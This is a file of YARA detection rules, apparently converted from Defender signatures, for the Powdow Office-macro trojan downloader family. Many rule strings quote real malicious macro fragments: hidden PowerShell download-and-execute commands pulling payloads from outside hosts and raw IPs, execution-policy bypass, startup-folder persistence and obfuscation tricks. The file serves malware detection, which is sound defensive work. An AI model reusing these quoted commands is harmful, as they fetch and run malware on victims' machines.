rule TrojanDownloader_O97M_Powdow_SS_2147753307_33
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 48 79 74 6e 70 63 64 73 79 76 71 71 73 73 73 76 72 72 6b 70 67 79 65 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Print #1, \"start /MIN C:\\Windo\" + \"ws\\SysWOW64\\\" + call1 + \" -win 1 -enc \" + LResult" ascii //weight: 1
        $x_1_3 = {69 20 3d 20 53 68 65 6c 6c 28 62 61 74 63 68 2c 20 30 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = "call1 = \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe" ascii //weight: 1
        $x_1_5 = "LResult = Replace(enc, \"_\", \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_34
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "lol = kind + \" \" + \"-w h -NoProfile -EP Bypass -C start-sleep -s 20;iwr \"\"http://www.j.mp/asjasdijidoaiwd\"\" -useB|iex;\"" ascii //weight: 3
        $x_1_2 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 [0-3] 4d 73 67 42 6f 78 20 22 45 52 72 4f 52 21 22}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"C:\\Users\\\" & Environ(\"UserName\") & \"\\Pictures\\notnice\" + \".\" + \"ps1\"" ascii //weight: 1
        $x_1_4 = ".Shellexecute ca.lc.Tag, jojo.jiji.Tag + jiajsijasd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_35
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 6f 77 65 72 72 20 26 20 72 6c 20 26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 70 3a 2f 2f 6c 69 66 65 73 74 79 6c 65 64 72 69 6e 6b 73 2e 68 75 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 63 73 33 2f 45 54 4c 5f [0-21] 2e 65 78 65 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-21] 2e 65 78 65 3b}  //weight: 1, accuracy: Low
        $x_1_2 = "powerr & rl & \" -w h Start-BitsTransfer -Source https://cargotrans-giobal.com/h/boom.exe -Destination C:\\Users\\Public\\Documents\\policyreally.exe;" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_36
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Msg = \"Error # \" & \" Power File error \" _" ascii //weight: 1
        $x_1_2 = "CreateObject(IAMTHEONE).Exec ONEHAND + TWOHANDS" ascii //weight: 1
        $x_1_3 = {79 61 7a 65 65 64 31 30 20 3d 20 22 34 22 20 2b 20 22 38 22 20 2b 20 22 40 22 20 2b 20 22 62 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 69 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 74 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 6c 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 79 22 20 2b 20 22 2e 63 6f 6d 2f 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 64 73 61 73 61 62 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 [0-15] 22 20 2b 20 22 73 61 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_37
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SistersRangeRover = \" http://%8234%8234@j.mp/dd" ascii //weight: 1
        $x_1_2 = "myChrysler = decrypt(\"r\", \"5\") + decrypt(\"w\", \"4\") + decrypt(\"n\", \"6\") + decrypt(\"u\", \"1\") + decrypt(\"j\", \"9\")" ascii //weight: 1
        $x_1_3 = "Shell myChrysler + SistersRangeRover: Shell decrypt(\"votm\", \"6\")" ascii //weight: 1
        $x_1_4 = "Mid(strInput, first, 1) = Chr(Asc(Mid(strInput, first, 1)) - second)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_38
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 57 7a 6a 6f 6b 70 6c 74 62 66 72 2e 62 61 74 22 [0-3] 4f 70 65 6e 20 62 61 74 63 68 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_2 = {41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 53 61 76 65 [0-3] 62 61 74 63 68 20 3d 20 22 4c 77 6c 6c 6e 76 65 72 79 77 6f 6e 63 6b 70 77 78 69 64 61 63 6b 62 76 2e 62 61 74 22 [0-3] 4f 70 65 6e 20 62 61 74 63 68 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_3 = "i = Shell(batch, 0)" ascii //weight: 1
        $x_1_4 = "s = s + \"ws\\System32\\\" + \"WindowsPo\" + \"werShell\\v1.0\\pow\" + \"ershell.exe\"" ascii //weight: 1
        $x_1_5 = "s = s + \" -win 1 -enc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_39
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateProcessA(0&, Chr(112) + \"ower\" + \"shell.exe \" + Chr(150) + \"WindowStyle Hidden\" + \"  IEX (New-Object Net.WebClient).DownloadString('http://34.136.17.214/ps.ps1')\", 0&, 0&, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, start, proc)" ascii //weight: 1
        $x_1_2 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-3] 4d 73 67 42 6f 78 20 22 52 75 6e 6e 69 6e 67 20 44 6f 63 75 6d 65 6e 74 2e 20 50 6c 65 61 73 65 20 77 61 69 74 2e 22 [0-3] 45 78 65 63 43 6d 64 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_40
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 64 20 3d 20 43 68 72 28 64 66 20 2d 20 31 30 33 29 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = "asdfaf = \"sdgfds csda bfgj vdfsh 424 grtjuy vfdsjhy \"" ascii //weight: 1
        $x_1_3 = {53 75 62 20 46 6f 72 6d 61 74 74 69 6e 67 50 61 6e 65 28 29 [0-3] 41 70 70 6c 69 63 61 74 69 6f 6e 2e 54 61 73 6b 50 61 6e 65 73 28 77 64 54 61 73 6b 50 61 6e 65 46 6f 72 6d 61 74 74 69 6e 67 29 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 52 75 6e 28 [0-15] 2c 20 [0-15] 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = {20 3d 20 73 64 28 [0-3] 29 20 26 20 73 64 28 [0-3] 29 20 26 20 73 64 28 [0-3] 29 20 26 20}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 0d 0a 53 65 74 20 [0-8] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-15] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_41
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "hmm3 = hmm2 + Anunaki + \"dsfsd4as3asd3\"" ascii //weight: 2
        $x_2_2 = "hmm3 = hmm2 + Anunaki + \"4jnsdjn33knadk\"" ascii //weight: 2
        $x_1_3 = "= Replace(\"Nothingisgood\", \"Nothingisgood\", \"h\")" ascii //weight: 1
        $x_1_4 = "= \"t\" & Replace(\"Flovelyknskn\", \"Flovelyknskn\", \"t\") & \"p\"" ascii //weight: 1
        $x_1_5 = "guntom3 = \"//loeajsjes\"" ascii //weight: 1
        $x_1_6 = "watchingyou = lovely & guntom1 & guntom2 & Left(guntom3, 2)" ascii //weight: 1
        $x_1_7 = "hmm2 = Left(hmm, 3) + \"p\" + String(1, \"/\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 5 of ($x_1_*))) or
            ((2 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_42
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 68 65 65 65 20 3d 20 22 53 68 65 22 [0-3] 6f 62 68 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 [0-22] 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_2_2 = {26 20 22 20 2d 77 20 68 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 71 64 79 68 79 67 6d 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 70 6c 75 67 69 6e 73 2f 6d 61 73 74 65 72 78 2f 4e 65 77 5f [0-75] 2e 65 60 78 65 22}  //weight: 2, accuracy: Low
        $x_1_3 = {26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-32] 22 20 26 20 22 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 00 22}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 22 70 6f 77 65 72 73 5e 22 [0-32] 20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 62 61 74 22 [0-32] 20 3d 20 22 68 65 6c 6c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_43
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetDF = Environ$(\"USERPROFILE\") & \"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jeje.bat" ascii //weight: 1
        $x_1_2 = "lol = \"wsamorecramoreipamoretamore.samorehell" ascii //weight: 1
        $x_1_3 = "loli = Replace(lol, \"amore\", \"\")" ascii //weight: 1
        $x_1_4 = "love = \"poamorewersamorehell.eamorexeamore amoreamore-winamoredowsamoretyamorele hidamoreden -EamorexecuamoretionPolamoreicy Byamorepass calc.exe" ascii //weight: 1
        $x_1_5 = "Set a = fs.CreateTextFile(GetDF, True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_44
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "lodhi = \"m\" + \"S\" + \"H\" + \"t\" + \"A\"" ascii //weight: 1
        $x_2_2 = {4d 73 67 42 6f 78 20 22 4c 6f 61 64 69 6e 67 2e 2e 2e 2e 22 3a 20 53 68 65 6c 6c 20 6c 6f 64 68 69 20 2b 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 25 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 40 6a 2e 6d 70 2f 22 20 2b 20 22 [0-15] 22 20 2b 20 22 [0-22] 22 3a 20 53 68 65 6c 6c 20 22}  //weight: 2, accuracy: Low
        $x_2_3 = {4d 73 67 42 6f 78 20 22 4c 6f 61 64 69 6e 67 [0-7] 22 3a 20 53 68 65 6c 6c 20 6c 6f 64 68 69 20 2b 20 22 20 68 74 74 70 3a 2f 2f 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 25 31 32 33 38 34 39 32 38 31 39 38 33 39 31 38 32 33 40 6a 2e 6d 70 2f 22 20 2b 20 22 68 64 6a 6b 73 61 64 68 6a 6b 73 61 22 20 2b 20 22 67 62 64 68 6b 61 73 67 64 68 6b 73 61 67 64 22 3a 20 53 68 65 6c 6c 20 22}  //weight: 2, accuracy: Low
        $x_1_4 = "ExcelFile = (ActivePresentation.Path & \"\\test.xlsx\")" ascii //weight: 1
        $x_1_5 = "Set exl = CreateObject(\"Excel.Application\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_45
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(Yajoojmajooj).Exec luli1 + luli2" ascii //weight: 1
        $x_1_2 = "Msg = \"Error # \" & \" Power File error \" _" ascii //weight: 1
        $x_1_3 = {79 61 7a 65 65 64 31 30 20 3d 20 22 34 22 20 2b 20 22 38 22 20 2b 20 22 40 22 20 2b 20 22 62 69 74 6c 79 22 20 2b 20 22 2e 63 6f 6d 2f 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 64 73 61 73 61 62 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 22 20 2b 20 22 [0-15] 22 20 2b 20 22 73 61 22}  //weight: 1, accuracy: Low
        $x_1_4 = "Debug.Print (Shell(IAnXZxcOS + Bh9gDA0D4 + Z4BVqZHfR))" ascii //weight: 1
        $x_1_5 = "Z4BVqZHfR = \"LLLdwdkwokwd" ascii //weight: 1
        $x_1_6 = "Debug.Print MsgBox(Chr$(69) & Chr$(82) & Chr$(82) & Chr$(79) & Chr$(82) & Chr$(33) & Chr$(32) & Chr$(80) & Chr$(108)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_46
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 41 75 74 6f 5f 4f 70 65 6e 28 29 [0-3] 4d 73 67 42 6f 78 20 22 45 72 72 6f 72 21 21}  //weight: 1, accuracy: Low
        $x_2_2 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/ajdwwdwdwdmlrufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 2
        $x_2_3 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/wdowdpufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 2
        $x_2_4 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/wdkfokwdokrufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 2
        $x_2_5 = "Call objShell.ShellExecute(k1.k2.Tag, \"https://www.bitly.com/ajdwwdwdrufhjwijjd\", \"\", \"open\", 1)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_SS_2147753307_47
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SS!MTB"
        threat_id = "2147753307"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 7b 20 69 77 72 20 68 74 74 70 3a 2f 2f 77 65 65 73 68 6f 70 70 69 2e 63 6f 6d 2f 77 70 2d 69 6e 63 6c 75 64 65 73 2f 49 44 33 2f [0-2] 2f [0-40] 2e 6a 70 67 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-10] 2e 65 78 65 7d 3b 20 26 20 7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68}  //weight: 1, accuracy: Low
        $x_1_2 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 7b 20 69 77 72 20 68 74 74 70 3a 2f 2f 31 30 34 2e 31 36 38 2e 31 36 30 2e 32 30 39 2f (4e 38|6e 65) 2f [0-40] 2e 6a 70 67 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-10] 2e 65 78 65 7d 3b 20 26 20 7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68}  //weight: 1, accuracy: Low
        $x_1_3 = {70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 48 69 64 64 65 6e 20 2d 45 78 65 63 75 74 69 6f 6e 50 6f 6c 69 63 79 20 42 79 70 61 73 73 20 20 2d 63 6f 6d 6d 61 6e 64 20 22 20 26 20 7b 20 69 77 72 20 68 74 74 70 3a 2f 2f 31 30 34 2e 31 36 38 2e 31 36 30 2e 32 30 39 2f (4e 38|6e 65) 2f [0-40] 2e 6a 70 67 20 2d 4f 75 74 46 69 6c 65 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 50 69 63 74 75 72 65 73 5c [0-10] 2e 65 78 65 7d 3b 20 26 20 7b 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 2d 46 69 6c 65 50 61 74 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DS_2147753371_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DS!MTB"
        threat_id = "2147753371"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "13"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 75 72 6c 6d 6f 6e [0-35] 22 20 41 6c 69 61 73 20 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 22}  //weight: 1, accuracy: Low
        $x_10_2 = "Herti1 = Environ(\"userprofile\") & \"\\\" & Rnd(1E+18) & \".com\"" ascii //weight: 10
        $x_1_3 = "= URLDownloadToFile(0, ThisDocument.DefaultTargetFrame, Herti1, 0, 0)" ascii //weight: 1
        $x_1_4 = "= GetObject(ThisDocument.XMLSaveThroughXSLT)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_DP_2147753372_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.DP!MTB"
        threat_id = "2147753372"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Me.Repaint" ascii //weight: 1
        $x_1_2 = "Unload Me" ascii //weight: 1
        $x_1_3 = "time2 = Now + TimeValue(\"0:00:03\")" ascii //weight: 1
        $x_1_4 = "REtas = Environ(Teriol.Caption)" ascii //weight: 1
        $x_1_5 = "Shell \"cmd /c\" & REtas & Trest.Tag, 0" ascii //weight: 1
        $x_1_6 = "Herti = REtas & Trest.Tag" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "XFBpY3R1cmVzXGhobnpuYmJmYS5leGV9" ascii //weight: 10
        $x_10_2 = "Ly8xOC4xOTYuMTU3Ljg2L1QvMzA0MTAwMC5qcGcg" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AR_2147753517_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AR!MTB"
        threat_id = "2147753517"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "'oci.nocivaf/1009:95.841.001.891//:ptth'(eliFdaolnwoD.)" ascii //weight: 10
        $x_1_2 = "llehsrewop c/ exe.dmc" ascii //weight: 1
        $x_1_3 = "StrReverse(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

